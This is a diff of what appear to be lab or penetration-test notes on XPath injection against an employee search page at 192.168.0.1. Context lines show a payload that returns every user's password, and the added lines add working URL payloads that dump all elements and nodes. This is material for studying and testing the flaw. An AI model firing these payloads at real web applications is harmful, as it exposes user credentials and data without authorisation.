@@ -7,7 +7,10 @@
 #While running the payload list we guessed that there might be a password element and so we appended //password%00 to the injection point before running the intruder.
 #The attack was successful using the following payload ')%5D//password%00 returning the contents of the password element for all users.
 #http://192.168.0.1/employee.php?work=')%5D//password%00&action=search
-
+#We were then able to return data in all elements by injecting ')%5D//*%00 
+#http://192.168.0.1/employee.php?work=')%5D//*%00&action=search
+#And also return all nodes using 
+#http://192.168.0.1/employee.php?work=%27)%5D//node()%00&action=search
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------
 XML Document Example - https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/#understanding-the-structure-of-xml-documents
 The first line of the XML document contains the XML declaration, which specifies the version used (in this case 1.0) and the type of character encoding (in this case UTF-8).
